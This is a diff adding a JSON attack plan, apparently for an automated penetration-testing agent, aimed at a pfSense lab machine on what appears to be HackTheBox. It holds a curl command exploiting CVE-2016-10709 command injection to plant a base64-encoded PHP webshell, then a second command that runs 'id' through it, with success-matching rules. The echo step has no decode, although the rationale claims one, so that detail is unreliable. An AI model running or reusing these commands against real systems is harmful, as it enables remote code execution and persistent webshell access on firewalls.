@@ -1,0 +1,95 @@
+{
+  "plan_id": "plan_1703875200_001",
+  "target_ip": "10.129.2.136",
+  "context_hash": "pfsense_lighttpd_1435_bsd_weak_highvalue",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "http_request",
+        "command_template": "curl -k 'https://{target}/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+\"PD9waHAgaWYoaXNzZXQoJF9HRVRbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICRfR0VUWydjbWQnXTsgaWYoJGNtZCl7IGVjaG8gc2hlbGxfZXhlYygkY21kKTsgfSBlY2hvICI8L3ByZT4iOyBkaWUoKTsgfSA/Pg==\">payload.php' -H 'User-Agent: Mozilla/5.0' -v",
+        "parameters": {
+          "target": "10.129.2.136",
+          "port": 443,
+          "path": "/status_rrd_graph_img.php",
+          "payload_file": "payload.php"
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1190",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.85,
+          "rationale_tags": [
+            "pfsense_identified",
+            "lighttpd_1.4.35",
+            "manual_exploit",
+            "base64_bypass"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "http_status",
+          "match_pattern": "200",
+          "negative_pattern": "(404|403|500|error)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+",
+        "insight": "Successful exploitation of pfSense RCE vulnerability via command injection in status_rrd_graph_img.php parameter, requiring manual payload encoding to bypass filtering",
+        "exploitation_logic": "Manual exploitation with Base64-encoded PHP payload to bypass strict input filtering mechanisms",
+        "vulnerability_context": "pfSense CVE-2016-10709 command injection in database parameter, public exploits fail due to filtering",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "http_request",
+        "command_template": "curl -k 'https://{target}/payload.php?cmd=id' -H 'User-Agent: Mozilla/5.0' -v",
+        "parameters": {
+          "target": "10.129.2.136",
+          "port": 443,
+          "path": "/payload.php",
+          "command": "id"
+        },
+        "timeout_seconds": 15
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1059",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.9,
+          "rationale_tags": [
+            "payload_uploaded",
+            "php_webshell",
+            "command_execution"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(uid=|gid=|groups=)",
+          "negative_pattern": "(404|403|Parse error)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "Access created writeup.php file with cmd parameter to execute commands",
+        "insight": "After successful payload upload, access the PHP file with cmd parameter for command execution",
+        "exploitation_logic": "Base64-decoded PHP creates webshell accepting cmd parameter for remote command execution",
+        "vulnerability_context": "Second stage of pfSense exploitation - command execution through uploaded webshell",
+        "source": "htb_sense1_writeup"
+      }
+    }
+  ],
+  "created_at": "2024-01-01T12:00:00Z"
+}
